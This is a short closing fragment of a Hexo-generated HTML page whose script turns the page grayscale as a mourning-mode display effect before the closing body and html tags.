    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>